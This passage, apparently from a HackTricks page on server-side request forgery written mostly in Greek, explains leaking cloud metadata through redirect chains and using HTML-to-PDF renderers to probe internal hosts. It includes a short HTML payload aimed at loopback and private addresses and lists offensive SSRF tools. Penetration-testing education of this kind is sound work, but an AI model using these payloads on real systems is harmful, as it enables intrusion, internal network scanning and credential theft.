- After N weird redirects (≥ 5 here) the application’s own wrapper decides “something is off” and switches to an error mode meant for debugging.
- In that mode it dumps the entire redirect chain plus final body back to the outside caller.
- Result: attacker sees every header + the metadata JSON, mission accomplished.

Note that this is interesting to leak status codes that you couldn't leak before (like a 200). However, if somehow you could also select the status code of the response (imagine that you can decide that the AWS metadata responds with a 500 status code), **there might be some status codes that directly leak the content of the response.**

### HTML-to-PDF renderers as blind SSRF gadgets

Libraries such as **TCPDF** (and wrappers like **spipu/html2pdf**) will automatically fetch any URLs present in attacker-controlled HTML while rendering a PDF. Each `<img>` or `<link rel="stylesheet">` attribute is resolved server-side via cURL, `getimagesize()`, or `file_get_contents()`, so you can drive the PDF worker to probe internal hosts even though no HTTP response is reflected to you.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- Το TCPDF 6.10.0 εκτελεί πολλαπλές προσπάθειες ανάκτησης για κάθε `<img>` resource, έτσι ένα μόνο payload μπορεί να δημιουργήσει πολλαπλά αιτήματα (χρήσιμο για timing-based port scans).
- Το html2pdf αντιγράφει τη συμπεριφορά του TCPDF για τα `<img>` και προσθέτει ανάκτηση CSS μέσα στο `Css::extractStyle()`, το οποίο απλώς καλεί `file_get_contents($href)` μετά από έναν επιφανειακό έλεγχο scheme. Εκμεταλλευτείτε το για να προσπελάσετε loopback services, RFC1918 ranges, ή cloud metadata endpoints.
- Συνδυάστε αυτό το SSRF primitive με τα [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) για να leak τόσο internal HTTP responses όσο και local files που αποδίδονται στο PDF.

Οι hardeners θα πρέπει να αφαιρούν τα external URLs πριν από την render ή να απομονώνουν τον renderer σε ένα network sandbox· μέχρι τότε, θεωρήστε τους PDF generators ως blind SSRF proxies.

## Εκμετάλλευση SSRF στο Cloud

Εάν βρείτε μια SSRF ευπάθεια σε μηχάνημα που τρέχει σε περιβάλλον cloud, μπορεί να καταφέρετε να αποκτήσετε ενδιαφέρουσες πληροφορίες για το cloud περιβάλλον και ακόμη διαπιστευτήρια:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Πλατφόρμες ευάλωτες σε SSRF

Πολλές γνωστές πλατφόρμες περιέχουν ή περιείχαν ευπάθειες SSRF — ελέγξτε τις σε:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Εργαλεία

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Εργαλείο για τον εντοπισμό και την εκμετάλλευση ευπαθειών SSRF

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

Αυτό το εργαλείο δημιουργεί Gopher payloads για:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ είναι ένας scanner ευπαθειών _Java RMI_ που υποστηρίζει επιθετικές λειτουργίες για τις πιο κοινές ευπάθειες _Java RMI_. Οι περισσότερες διαθέσιμες λειτουργίες υποστηρίζουν την επιλογή `--ssrf`, για να δημιουργήσουν ένα _SSRF_ payload για την αιτούμενη λειτουργία. Μαζί με την επιλογή `--gopher`, μπορούν να παραχθούν έτοιμα προς χρήση _gopher_ payloads απευθείας.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

Το SSRF Proxy είναι ένας multi-threaded HTTP proxy server σχεδιασμένος για να τούνελάρει την HTTP κίνηση πελατών μέσω HTTP servers ευάλωτων σε Server-Side Request Forgery (SSRF).

### Για εξάσκηση


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Αναφορές

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
